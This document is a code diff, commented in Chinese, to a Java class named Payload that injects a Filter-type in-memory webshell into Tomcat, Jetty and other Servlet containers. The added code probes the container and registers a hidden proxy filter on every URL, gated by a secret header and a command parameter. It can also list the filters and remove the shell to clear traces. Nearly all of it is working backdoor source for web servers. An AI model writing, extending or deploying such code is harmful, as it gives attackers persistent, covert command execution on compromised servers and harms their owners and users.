@@ -1025,27 +1025,38 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
         java.lang.reflect.Method[] ms = chain.getClass().getMethods();
         for (int i = 0; i < ms.length; i++) {
             if ("doFilter".equals(ms[i].getName()) && ms[i].getParameterTypes().length == 2) {
-                ms[i].invoke(chain, req, res);
+                try {
+                    // Jetty 的 ChainEnd 是包私有类：方法本身是 public，但从我们的类加载器
+                    // 看不可访问，不 setAccessible 会直接 IllegalAccessException（表现为
+                    // 每个非门禁请求 500）。
+                    try {
+                        ms[i].setAccessible(true);
+                    } catch (Throwable ignored) {
+                        // 安全管理器禁止时继续试，真不行会在 invoke 时报错
+                    }
+                    ms[i].invoke(chain, req, res);
+                } catch (java.lang.reflect.InvocationTargetException e) {
+                    // 反射调用会把下游异常包一层，而 Proxy 又会把「未声明的受检异常」再裹成
+                    // UndeclaredThrowableException —— 两层包装后页面上只剩一句无意义的
+                    // 500，真实错误（业务为什么炸）就丢了。这里解开，受检异常包成运行时异常。
+                    Throwable c = e.getCause() == null ? e : e.getCause();
+                    if (c instanceof RuntimeException) {
+                        throw (RuntimeException) c;
+                    }
+                    if (c instanceof Error) {
+                        throw (Error) c;
+                    }
+                    throw new RuntimeException(c);
+                }
                 break;
             }
         }
         return null;
     }
 
-    /** 探测：能不能注入内存马，取决于上下文是否可达、容器 API 是哪一套。 */
+    /** 探测：容器种类、Servlet API 版本、当前可尝试的注入路径。 */
     private static String msProbe() {
-        String api = "unknown";
-        try {
-            Class.forName("jakarta.servlet.Filter");
-            api = "jakarta";
-        } catch (Throwable t) {
-            try {
-                Class.forName("javax.servlet.Filter");
-                api = "javax";
-            } catch (Throwable ignored) {
-                // 非 Servlet 容器
-            }
-        }
+        String kind = containerKind();
         Object ctx = null;
         String reason = "";
         try {
@@ -1054,22 +1065,43 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
             reason = t.getClass().getSimpleName() + ": " + t.getMessage();
         }
         StringBuilder sb = new StringBuilder("{");
-        sb.append("\"servletApi\":").append(json(api));
+        sb.append("\"servletApi\":").append(json(servletApi()));
         sb.append(",\"serverInfo\":").append(json(serverInfo()));
-        sb.append(",\"contextAvailable\":").append(ctx != null);
-        sb.append(",\"canInject\":").append(ctx != null && !"unknown".equals(api));
+        sb.append(",\"container\":").append(json(kind));
+        sb.append(",\"contextAvailable\":").append(sApp != null);
+        sb.append(",\"strategies\":[");
+        String[] st = strategies();
+        for (int i = 0; i < st.length; i++) {
+            if (i > 0) {
+                sb.append(',');
+            }
+            sb.append(json(st[i]));
+        }
+        sb.append(']');
         if (ctx != null) {
             sb.append(",\"contextPath\":").append(json(String.valueOf(safeCall(ctx, "getPath"))));
             Object defs = safeCall(ctx, "findFilterDefs");
             sb.append(",\"filterCount\":").append(defs != null && defs.getClass().isArray()
                     ? java.lang.reflect.Array.getLength(defs) : -1);
-        } else {
+        } else if (sApp != null) {
             sb.append(",\"reason\":").append(json(reason));
+        } else {
+            sb.append(",\"reason\":").append(json("载体未注入 ServletContext"));
         }
         return sb.append('}').toString();
     }
 
-    /** 注入 Filter 内存马：FilterDef + FilterMap + filterConfigs 三处都要登记。 */
+    /**
+     * 注入 Filter 型内存马：按容器能力挑路径，失败则顺次降级。
+     *
+     * 三条路径的差别在于「往哪登记、谁负责实例化」：
+     *   * tomcat-context：FilterDef + FilterMap + filterConfigs 三处都要塞，
+     *     少塞 filterConfigs 首次请求会因为拿不到实例而直接跳过滤镜；
+     *   * jetty-handler：ServletHandler 的 filters 列表 + filterMappings，
+     *     已启动的 Jetty 会拒绝 addFilter*，只能改列表并手动 start()；
+     *   * servletcontext：Servlet 3.0 的 addFilter + addMappingForUrlPatterns，
+     *     Undertow / WebLogic / GlassFish 这类容器只认这条路。
+     */
     private static String msInject(String name, String gateHeader, String gateValue, String cmdParam) throws Exception {
         if (name == null || name.length() == 0) {
             return "ERROR:缺少 filter 名";
@@ -1077,8 +1109,10 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
         if (gateHeader == null || gateHeader.length() == 0 || gateValue == null || gateValue.length() == 0) {
             return "ERROR:缺少触发头（gate_header / gate_value）";
         }
+        if (sApp == null) {
+            return "ERROR:载体未注入 ServletContext：内存马只能在 JSP 上下文内操作";
+        }
         String cp = cmdParam == null || cmdParam.length() == 0 ? "cmd" : cmdParam;
-        Object ctx = stdCtx();
         Class<?> fi = filterIface();
 
         Payload handler = new Payload();
@@ -1088,6 +1122,34 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
         Object proxy = java.lang.reflect.Proxy.newProxyInstance(
                 fi.getClassLoader(), new Class<?>[]{fi}, handler);
 
+        String[] order = strategies();
+        StringBuilder err = new StringBuilder();
+        for (int i = 0; i < order.length; i++) {
+            try {
+                if ("tomcat-context".equals(order[i])) {
+                    injectTomcat(name, proxy);
+                } else if ("jetty-handler".equals(order[i])) {
+                    injectJetty(name, proxy);
+                } else {
+                    injectGeneric(name, proxy);
+                }
+                return "OK filter=" + name + " gate=" + gateHeader + ": " + gateValue
+                        + " param=" + cp + " url=/* via=" + order[i]
+                        + " container=" + containerKind();
+            } catch (Throwable t) {
+                err.append(order[i]).append(" 失败(").append(t.getClass().getSimpleName());
+                if (t.getMessage() != null) {
+                    err.append(": ").append(t.getMessage());
+                }
+                err.append("); ");
+            }
+        }
+        return "ERROR:注入失败（容器 " + containerKind() + "，全部路径均不可用）：" + err;
+    }
+
+    /** Tomcat：FilterDef + FilterMap + filterConfigs。 */
+    private static void injectTomcat(String name, Object proxy) throws Exception {
+        Object ctx = stdCtx();
         Class<?> fdCls = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
         Object fd = fdCls.newInstance();
         call(fd, "setFilterName", name);
@@ -1102,59 +1164,209 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
         call(fm, "setDispatcher", "REQUEST");
         call(ctx, "addFilterMapBefore", fm);
 
-        // 关键一步：只加 FilterDef/FilterMap 还不够，Tomcat 用 filterConfigs 缓存
-        // 已实例化的过滤器，不塞进去首次请求会拿不到实例。
+        bindTomcatConfig(ctx, name);
+    }
+
+    /**
+     * 把 FilterDef 变成 filterConfigs 里的实例。
+     *
+     * Tomcat 用 filterConfigs 缓存已实例化的过滤器：只加 FilterDef/FilterMap 时
+     * ApplicationFilterFactory 取不到实例会静默跳过，表现为「注入成功但触发无效」。
+     * 这个缓存没有公开的写入接口，只能直接塞 Map（字段名在各版本里稳定）。
+     */
+    private static void bindTomcatConfig(Object ctx, String name) throws Exception {
+        Object fd = call(ctx, "findFilterDef", name);
+        if (fd == null) {
+            throw new IllegalStateException("filterDef 未登记成功：" + name);
+        }
         Class<?> cfgCls = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
         java.lang.reflect.Constructor<?> ctor = cfgCls.getDeclaredConstructor(
-                Class.forName("org.apache.catalina.Context"), fdCls);
+                Class.forName("org.apache.catalina.Context"), fd.getClass());
         ctor.setAccessible(true);
         Object cfg = ctor.newInstance(ctx, fd);
         Object map = field(ctx, "filterConfigs");
-        if (map instanceof java.util.Map) {
-            ((java.util.Map) map).put(name, cfg);
+        if (!(map instanceof java.util.Map)) {
+            throw new IllegalStateException("filterConfigs 不是 Map，无法登记实例");
         }
-        return "OK filter=" + name + " gate=" + gateHeader + ": " + gateValue
-                + " param=" + cp + " url=/*";
+        ((java.util.Map) map).put(name, cfg);
+    }
+
+    /**
+     * Jetty 9.4~11：ServletHandler 持有 filters 列表与 filterMappings。
+     *
+     * 先试公开方法 addFilterWithMapping（未启动时可用）；已启动的 Jetty 会对
+     * addFilter* 抛 IllegalStateException，此时直接改列表 + 补映射 + 手动 start()，
+     * 让容器用当前上下文把 init(FilterConfig) 跑完。
+     */
+    private static void injectJetty(String name, Object proxy) throws Exception {
+        Object handler = jettyServletHandler();
+        Class<?> fhCls = hostClass(handler, "org.eclipse.jetty.servlet.FilterHolder",
+                "org.eclipse.jetty.ee10.servlet.FilterHolder",
+                "org.eclipse.jetty.ee9.servlet.FilterHolder",
+                "org.eclipse.jetty.ee8.servlet.FilterHolder");
+        Object fh = fhCls.getConstructor(filterIface()).newInstance(proxy);
+        call(fh, "setName", name);
+        try {
+            call(handler, "addFilterWithMapping", fh, "/*", dispatcherSet());
+        } catch (Throwable t) {
+            // 个别版本在已启动时会拒绝公开方法，退回直接改集合 + 补映射
+            java.util.List filters = jettyList(handler, "_filters");
+            filters.add(fh);
+            storeJettyList(handler, "_filters", filters);
+            addJettyMapping(handler, name);
+        }
+        // 新建的 holder 还没 init：不 start 的话 Jetty 会把它当未就绪的过滤器跳过，
+        // 表现为「注入成功、列表里也有，但请求不经过它」。
+        Object started = safeCall(fh, "isStarted");
+        if (!Boolean.TRUE.equals(started)) {
+            call(fh, "start");
+        }
+    }
+
+    /** 给已存在的 holder 补 /* 映射：FilterMapping 的构造器在 9.4/10/11 之间有差异，两套都试。 */
+    private static void addJettyMapping(Object handler, String name) throws Exception {
+        Class<?> fmCls = hostClass(handler, "org.eclipse.jetty.servlet.FilterMapping",
+                "org.eclipse.jetty.ee10.servlet.FilterMapping",
+                "org.eclipse.jetty.ee9.servlet.FilterMapping",
+                "org.eclipse.jetty.ee8.servlet.FilterMapping");
+        Object fm = null;
+        try {
+            fm = fmCls.getConstructor(String.class, String.class, java.util.EnumSet.class)
+                    .newInstance(name, "/*", dispatcherSet());
+        } catch (Throwable ignored) {
+            fm = fmCls.newInstance();
+            call(fm, "setFilterName", name);
+            call(fm, "setPathSpec", "/*");
+            call(fm, "setDispatcherTypes", dispatcherSet());
+        }
+        call(handler, "addFilterMapping", fm);
+    }
+
+    /** Servlet 3.0 标准动态注册：addFilter + addMappingForUrlPatterns。 */
+    private static void injectGeneric(String name, Object proxy) throws Exception {
+        if (servletApi().equals("unknown")) {
+            throw new IllegalStateException("目标不是 Servlet 容器（找不到 Filter 接口）");
+        }
+        Object reg = call(sApp, "addFilter", name, proxy);
+        if (reg == null) {
+            throw new IllegalStateException("addFilter 返回 null，容器不支持动态注册");
+        }
+        call(reg, "addMappingForUrlPatterns", null, Boolean.FALSE, new String[]{"/*"});
+        // Tomcat 也实现了这条路，但它只登记 FilterDef/FilterMap，实例缓存仍要自己补
+        Object ctx = null;
+        try {
+            ctx = stdCtx();
+        } catch (Throwable ignored) {
+            // 非 Tomcat：实例化由容器自己负责，到此结束
+        }
+        if (ctx != null) {
+            bindTomcatConfig(ctx, name);
+        }
     }
 
     /** 枚举当前上下文里的 Filter，用于确认注入结果与清理痕迹。 */
-    private static String msList() throws Exception {
-        Object ctx = stdCtx();
-        StringBuilder sb = new StringBuilder("{\"filters\":[");
-        Object defs = call(ctx, "findFilterDefs");
-        if (defs != null && defs.getClass().isArray()) {
-            int n = java.lang.reflect.Array.getLength(defs);
-            for (int i = 0; i < n; i++) {
-                Object d = java.lang.reflect.Array.get(defs, i);
-                if (i > 0) {
-                    sb.append(',');
+    private static String msList() {
+        java.util.List<String> items = new java.util.ArrayList<String>();
+        String via = "none";
+        Object ctx = null;
+        try {
+            ctx = stdCtx();
+        } catch (Throwable ignored) {
+            // 非 Tomcat，下面的分支各自找来源
+        }
+        if (ctx != null) {
+            via = "tomcat-context";
+            Object defs = safeCall(ctx, "findFilterDefs");
+            if (defs != null && defs.getClass().isArray()) {
+                int len = java.lang.reflect.Array.getLength(defs);
+                for (int i = 0; i < len; i++) {
+                    Object d = java.lang.reflect.Array.get(defs, i);
+                    items.add("{\"name\":" + json(String.valueOf(safeCall(d, "getFilterName")))
+                            + ",\"class\":" + json(String.valueOf(safeCall(d, "getFilterClass"))) + "}");
                 }
-                sb.append("{\"name\":").append(json(String.valueOf(safeCall(d, "getFilterName"))))
-                        .append(",\"class\":").append(json(String.valueOf(safeCall(d, "getFilterClass"))))
-                        .append('}');
+            }
+        } else {
+            Object handler = null;
+            try {
+                handler = jettyServletHandler();
+            } catch (Throwable ignored) {
+                // 不是 Jetty
+            }
+            if (handler != null) {
+                via = "jetty-handler";
+                java.util.List filters = null;
+                try {
+                    filters = jettyList(handler, "_filters");
+                } catch (Throwable ignored) {
+                    filters = null;
+                }
+                if (filters != null) {
+                    for (int i = 0; i < filters.size(); i++) {
+                        Object fh = filters.get(i);
+                        items.add("{\"name\":" + json(String.valueOf(safeCall(fh, "getName")))
+                                + ",\"class\":" + json(String.valueOf(safeCall(fh, "getClassName"))) + "}");
+                    }
+                }
+            } else if (sApp != null) {
+                Object regs = safeCall(sApp, "getFilterRegistrations");
+                if (regs instanceof java.util.Map) {
+                    via = "servletcontext";
+                    java.util.Iterator it = ((java.util.Map) regs).values().iterator();
+                    while (it.hasNext()) {
+                        Object r = it.next();
+                        items.add("{\"name\":" + json(String.valueOf(safeCall(r, "getName")))
+                                + ",\"class\":" + json(String.valueOf(safeCall(r, "getClassName"))) + "}");
+                    }
+                }
             }
         }
-        sb.append("],\"maps\":[");
-        Object maps = call(ctx, "findFilterMaps");
-        if (maps != null && maps.getClass().isArray()) {
-            int n = java.lang.reflect.Array.getLength(maps);
-            for (int i = 0; i < n; i++) {
-                Object m = java.lang.reflect.Array.get(maps, i);
-                if (i > 0) {
-                    sb.append(',');
-                }
-                sb.append("{\"name\":").append(json(String.valueOf(safeCall(m, "getFilterName"))))
-                        .append('}');
+        StringBuilder sb = new StringBuilder("{\"container\":").append(json(containerKind()));
+        sb.append(",\"via\":").append(json(via)).append(",\"filters\":[");
+        for (int i = 0; i < items.size(); i++) {
+            if (i > 0) {
+                sb.append(',');
             }
+            sb.append(items.get(i));
         }
         return sb.append("]}").toString();
     }
 
     /** 卸载：三处登记都清掉，避免留下「能触发但列不出来」的残影。 */
-    private static String msRemove(String name) throws Exception {
+    private static String msRemove(String name) {
         if (name == null || name.length() == 0) {
             return "ERROR:缺少 filter 名";
         }
+        String[] order = strategies();
+        StringBuilder err = new StringBuilder();
+        for (int i = 0; i < order.length; i++) {
+            try {
+                String r = "";
+                if ("tomcat-context".equals(order[i])) {
+                    r = removeTomcat(name);
+                } else if ("jetty-handler".equals(order[i])) {
+                    r = removeJetty(name);
+                } else {
+                    r = removeGeneric(name);
+                }
+                if (r != null && r.length() > 0) {
+                    return r;
+                }
+            } catch (Throwable t) {
+                err.append(order[i]).append(" 失败(").append(t.getClass().getSimpleName());
+                if (t.getMessage() != null) {
+                    err.append(": ").append(t.getMessage());
+                }
+                err.append("); ");
+            }
+        }
+        if (err.length() == 0) {
+            // 各条路径都没抛错、也没找到同名 filter：说明本来就没了，不算失败
+            return "OK 未找到 " + name + "（容器 " + containerKind() + "，可能已卸载）";
+        }
+        return "ERROR:卸载失败（容器 " + containerKind() + "）：" + err;
+    }
+
+    private static String removeTomcat(String name) throws Exception {
         Object ctx = stdCtx();
         int hit = 0;
 
@@ -1197,7 +1409,289 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
         if (cfgs instanceof java.util.Map && ((java.util.Map) cfgs).remove(name) != null) {
             hit++;
         }
-        return "OK removed " + name + "（清理 " + hit + " 处登记）";
+        if (hit == 0) {
+            return "";
+        }
+        return "OK removed " + name + "（Tomcat，清理 " + hit + " 处登记）";
+    }
+
+    /** Jetty：从 filters 列表摘掉 holder，并清掉指向它的映射，否则匹配到空 holder 会 500。 */
+    private static String removeJetty(String name) throws Exception {
+        Object handler = jettyServletHandler();
+        java.util.List filters = jettyList(handler, "_filters");
+        Object target = null;
+        for (int i = 0; i < filters.size(); i++) {
+            Object fh = filters.get(i);
+            if (name.equals(String.valueOf(safeCall(fh, "getName")))) {
+                target = fh;
+                break;
+            }
+        }
+        if (target == null) {
+            return "";
+        }
+        filters.remove(target);
+        storeJettyList(handler, "_filters", filters);
+        int hit = 1;
+        java.util.List maps = null;
+        try {
+            maps = jettyList(handler, "_filterMappings");
+        } catch (Throwable ignored) {
+            maps = null;
+        }
+        if (maps != null) {
+            for (int i = maps.size() - 1; i >= 0; i--) {
+                Object fm = maps.get(i);
+                if (name.equals(String.valueOf(safeCall(fm, "getFilterName")))) {
+                    maps.remove(i);
+                    hit++;
+                }
+            }
+            storeJettyList(handler, "_filterMappings", maps);
+        }
+        try {
+            call(target, "stop");
+        } catch (Throwable ignored) {
+            // 已经停了就不用管
+        }
+        // 9.4 会把 filter 链缓存起来，不失效的话卸载后还会走旧链
+        safeCall(handler, "invalidateChainsCache");
+        return "OK removed " + name + "（Jetty，清理 " + hit + " 处登记）";
+    }
+
+    /**
+     * Servlet 3.0 没有运行时卸载接口：addFilter 只增不删。
+     * 这里如实报错，而不是假装成功——否则操作员会以为痕迹已经清掉了。
+     */
+    private static String removeGeneric(String name) {
+        Object regs = safeCall(sApp, "getFilterRegistrations");
+        if (!(regs instanceof java.util.Map)) {
+            return "";
+        }
+        if (!((java.util.Map) regs).containsKey(name)) {
+            return "";
+        }
+        return "ERROR:" + containerKind() + " 未提供运行时卸载接口（Servlet 3.0 只增不删），"
+                + "该 filter 仍在生效：需重启容器，或改用 tomcat-context / jetty-handler 路径注入";
+    }
+
+    /** 从 ServletContext 里找到 Jetty 的 ServletHandler（逐层找「谁提供 getServletHandler」，不猜字段名）。 */
+    private static Object jettyServletHandler() throws Exception {
+        if (sApp == null) {
+            throw new IllegalStateException("载体未注入 ServletContext");
+        }
+        Object h = findServletHandler(sApp, 2);
+        if (h != null) {
+            return h;
+        }
+        throw new IllegalStateException("无法从 " + sApp.getClass().getName() + " 定位 ServletHandler");
+    }
+
+    /**
+     * Jetty 各版本把 ServletContextHandler 藏在不同字段里（字段名从 _scontextHandler
+     * 到 _contextHandler 都出现过，类型也从 ServletContextHandler 退化成 ContextHandler），
+     * 所以按「这个对象能不能给出 ServletHandler」判断，不按名字或类型匹配。
+     */
+    private static Object findServletHandler(Object o, int depth) {
+        if (o == null || depth < 0) {
+            return null;
+        }
+        if (hasMethod(o, "getServletHandler")) {
+            try {
+                Object h = call(o, "getServletHandler");
+                if (h != null) {
+                    return h;
+                }
+            } catch (Throwable ignored) {
+                // 继续往下找
+            }
+        }
+        Class<?> c = o.getClass();
+        while (c != null) {
+            java.lang.reflect.Field[] fs;
+            try {
+                fs = c.getDeclaredFields();
+            } catch (Throwable t) {
+                return null;
+            }
+            for (int i = 0; i < fs.length; i++) {
+                if (java.lang.reflect.Modifier.isStatic(fs[i].getModifiers()) || fs[i].getType().isPrimitive()) {
+                    continue;
+                }
+                Object v;
+                try {
+                    fs[i].setAccessible(true);
+                    v = fs[i].get(o);
+                } catch (Throwable t) {
+                    continue;
+                }
+                if (v == null) {
+                    continue;
+                }
+                if (hasMethod(v, "getServletHandler")) {
+                    try {
+                        Object h = call(v, "getServletHandler");
+                        if (h != null) {
+                            return h;
+                        }
+                    } catch (Throwable ignored) {
+                        // 换下一个字段
+                    }
+                }
+                if (depth > 0) {
+                    Object h = findServletHandler(v, depth - 1);
+                    if (h != null) {
+                        return h;
+                    }
+                }
+            }
+            c = c.getSuperclass();
+        }
+        return null;
+    }
+
+    private static boolean hasMethod(Object o, String name) {
+        java.lang.reflect.Method[] ms = o.getClass().getMethods();
+        for (int i = 0; i < ms.length; i++) {
+            if (name.equals(ms[i].getName())) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    /** DispatcherType.REQUEST 的 EnumSet：jakarta / javax 是不同类，只能运行期造。 */
+    private static Object dispatcherSet() throws Exception {
+        Class<?> dt;
+        try {
+            dt = Class.forName("jakarta.servlet.DispatcherType");
+        } catch (Throwable ignored) {
+            dt = Class.forName("javax.servlet.DispatcherType");
+        }
+        Object req = null;
+        Object[] vals = dt.getEnumConstants();
+        for (int i = 0; i < vals.length; i++) {
+            if ("REQUEST".equals(String.valueOf(vals[i]))) {
+                req = vals[i];
+            }
+        }
+        if (req == null) {
+            throw new IllegalStateException("DispatcherType 里找不到 REQUEST");
+        }
+        return java.util.EnumSet.of((java.lang.Enum) req);
+    }
+
+    /** 容器种类：优先看 serverInfo，拿不到再按 ServletContext 实现类兜底。 */
+    private static String containerKind() {
+        String si = serverInfo().toLowerCase();
+        if (si.indexOf("tomcat") >= 0) {
+            return "tomcat";
+        }
+        if (si.indexOf("jetty") >= 0) {
+            return "jetty";
+        }
+        if (si.indexOf("undertow") >= 0) {
+            return "undertow";
+        }
+        if (si.indexOf("weblogic") >= 0) {
+            return "weblogic";
+        }
+        if (si.indexOf("websphere") >= 0) {
+            return "websphere";
+        }
+        if (si.indexOf("glassfish") >= 0 || si.indexOf("payara") >= 0) {
+            return "glassfish";
+        }
+        if (sApp != null) {
+            String cn = sApp.getClass().getName();
+            if (cn.indexOf("StandardContext") >= 0) {
+                return "tomcat";
+            }
+            if (cn.indexOf("jetty") >= 0) {
+                return "jetty";
+            }
+        }
+        return "unknown";
+    }
+
+    private static String servletApi() {
+        try {
+            Class.forName("jakarta.servlet.Filter");
+            return "jakarta";
+        } catch (Throwable ignored) {
+            // 老容器
+        }
+        try {
+            Class.forName("javax.servlet.Filter");
+            return "javax";
+        } catch (Throwable ignored) {
+            return "unknown";
+        }
+    }
+
+    /**
+     * 取 ServletHandler 里的过滤器/映射集合。
+     *
+     * Jetty 10/11 存成 List（可直接改），9.4 存成数组（FilterHolder[]）—— 按数组存的
+     * 版本必须读出来改完再写回，否则「列表里看不到、卸载也找不到」。
+     */
+    private static java.util.List jettyList(Object handler, String name) throws Exception {
+        Object v = field(handler, name);
+        if (v instanceof java.util.List) {
+            return (java.util.List) v;
+        }
+        java.util.List out = new java.util.ArrayList();
+        if (v != null && v.getClass().isArray()) {
+            int n = java.lang.reflect.Array.getLength(v);
+            for (int i = 0; i < n; i++) {
+                out.add(java.lang.reflect.Array.get(v, i));
+            }
+        }
+        return out;
+    }
+
+    /** 回写：List 形态是原地改的，只有数组形态需要按原组件类型重建数组。 */
+    private static void storeJettyList(Object handler, String name, java.util.List items) throws Exception {
+        Object cur = field(handler, name);
+        if (cur instanceof java.util.List) {
+            return;
+        }
+        java.lang.reflect.Field f = fieldRef(handler, name);
+        Class<?> ct = f.getType().getComponentType();
+        if (ct == null) {
+            throw new IllegalStateException("字段 " + name + " 既不是 List 也不是数组");
+        }
+        Object arr = java.lang.reflect.Array.newInstance(ct, items.size());
+        for (int i = 0; i < items.size(); i++) {
+            java.lang.reflect.Array.set(arr, i, items.get(i));
+        }
+        f.set(handler, arr);
+    }
+
+    /** 用「宿主对象的类加载器」加载容器类：Jetty 把 org.eclipse.jetty.* 对 webapp 隐藏了。 */
+    private static Class<?> hostClass(Object host, String... names) throws ClassNotFoundException {
+        ClassLoader cl = host == null ? null : host.getClass().getClassLoader();
+        ClassNotFoundException last = null;
+        for (int i = 0; i < names.length; i++) {
+            try {
+                return Class.forName(names[i], true, cl);
+            } catch (ClassNotFoundException e) {
+                last = e;
+            }
+        }
+        throw last != null ? last : new ClassNotFoundException(names.length > 0 ? names[0] : "");
+    }
+
+    /** 按容器给出可尝试的注入路径，顺序即尝试顺序。 */
+    private static String[] strategies() {
+        String kind = containerKind();
+        if ("tomcat".equals(kind)) {
+            return new String[]{"tomcat-context", "servletcontext"};
+        }
+        if ("jetty".equals(kind)) {
+            return new String[]{"jetty-handler", "servletcontext"};
+        }
+        return new String[]{"servletcontext"};
     }
 
     private static Object stdCtx() throws Exception {
